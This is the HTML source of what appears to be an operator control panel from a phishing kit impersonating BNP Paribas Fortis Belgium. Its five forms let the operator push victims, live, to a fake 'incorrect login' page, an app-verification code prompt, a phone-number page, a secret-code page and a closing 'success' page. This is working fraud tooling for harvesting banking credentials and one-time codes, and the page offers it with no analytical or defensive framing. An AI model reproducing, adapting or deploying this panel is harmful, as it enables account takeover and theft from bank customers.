<!DOCTYPE html>
<html lang="fr">
<head>
<title>Espace bnp ortis belgique</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="container">

  <h3> 

		
  PANEL ADMIN BANQUE BNP BELGIQUE</h3>
  <br/>
  <p><h4>Utiliser l'une des options ci-dessous pour controler le système et cliquez sur <a>valider</a> pour la prise en compte:</h4></p>
  <br/>
 
   <table class="table table-bordered">
    
    <tbody>
      <tr>
        <td><h4>1 - Séléctionner la page de login incorrecte </h4></td>
        <td><form method="post"  action="./auto_system/Select_Login.php" style="
    display: contents;
    margin-top: 0em;
    margin-block-end: 1em;
">  <input style="display: none;" type="text" name="textLogin">    <button type="submit" style="
    color: #ff6600;
    font-size: 23px;
    background-color: white;
    border: none;
    font-size: 28px;
    font-family: sans-serif;
"><a href="#" class="w3-right w3-btn" style="
    color: #ff6600;
    font-size: 23px;
    margin: 2px 14px 31px 11px;
    font-size: 28px;
    font-family: sans-serif;
"><span class="w3-hide-small" style="
    color: #ff6600;
    font-size: 28px;
    font-family: sans-serif;
">Valider </span></a></button> </form></td>
  
      </tr> 
	  
	
	  <tr>
        <td><h4>2 - Application Saisisser les chiffres dans le champ << copier dans le champ suivant >> </h4></td>
        <td><form method="post"  action="./auto_system/Select_appverify.php" style="
    display: contents;
    margin-top: 0em;
    margin-block-end: 1em;
">  <input style="display: none;" type="text" name="Appverify">    
 <input required="" type="text" name="textAppverify" style="
    padding: 8px;
    border: 1px solid #ccc;
">
<button type="submit" style="
    color: #ff6600;
    font-size: 23px;
    background-color: white;
    border: none;
    font-size: 28px;
    font-family: sans-serif;
"><a href="#" class="w3-right w3-btn" style="
    color: #ff6600;
    font-size: 23px;
    margin: 2px 14px 31px 11px;
    font-size: 28px;
    font-family: sans-serif;
"><span class="w3-hide-small" style="
    color: #ff6600;
    font-size: 28px;
    font-family: sans-serif;
">Valider </span></a></button> </form></td>
  
      </tr>
   
	        <tr>
        <td><h4>3 - Séléctionner la page de Numero GSM </h4></td>
        <td><form method="post"  action="./auto_system/Select_Gsm.php" style="
    display: contents;
    margin-top: 0em;
    margin-block-end: 1em;
">  <input style="display: none;" type="text" name="textGsm">    <button type="submit" style="
    color: #ff6600;
    font-size: 23px;
    background-color: white;
    border: none;
    font-size: 28px;
    font-family: sans-serif;
"><a href="#" class="w3-right w3-btn" style="
    color: #ff6600;
    font-size: 23px;
    margin: 2px 14px 31px 11px;
    font-size: 28px;
    font-family: sans-serif;
"><span class="w3-hide-small" style="
    color: #ff6600;
    font-size: 28px;
    font-family: sans-serif;
">Valider </span></a></button> </form></td>
  
      </tr> 
	  
	  
	  
	      <tr>
        <td><h4>4 - Séléctionner la page Code secret </h4></td>
        <td><form method="post"  action="./auto_system/Select_CodeSecret.php" style="
    display: contents;
    margin-top: 0em;
    margin-block-end: 1em;
">  <input style="display: none;" type="text" name="textCodescret">    <button type="submit" style="
    color: #ff6600;
    font-size: 23px;
    background-color: white;
    border: none;
    font-size: 28px;
    font-family: sans-serif;
"><a href="#" class="w3-right w3-btn" style="
    color: #ff6600;
    font-size: 23px;
    margin: 2px 14px 31px 11px;
    font-size: 28px;
    font-family: sans-serif;
"><span class="w3-hide-small" style="
    color: #ff6600;
    font-size: 28px;
    font-family: sans-serif;
">Valider </span></a></button> </form></td>
  
      </tr> 
     <tr>
        <td><h4>5 - Séléctionner la page succès << FIN >>  </h4></td>
        <td><form method="post"  action="./auto_system/Select_Exit.php" style="
    display: contents;
    margin-top: 0em;
    margin-block-end: 1em;
">  <input style="display: none;" type="text" name="textExit">    <button type="submit" style="
    color: #ff6600;
    font-size: 23px;
    background-color: white;
    border: none;
    font-size: 28px;
    font-family: sans-serif;
"><a href="#" class="w3-right w3-btn" style="
    color: #ff6600;
    font-size: 23px;
    margin: 2px 14px 31px 11px;
    font-size: 28px;
    font-family: sans-serif;
"><span class="w3-hide-small" style="
    color: #ff6600;
    font-size: 28px;
    font-family: sans-serif;
">Valider </span></a></button> </form></td>
  
      </tr>
    </tbody>
  </table>
</div>
  <script src="assets/js/main.js"></script>
</body>
</html>
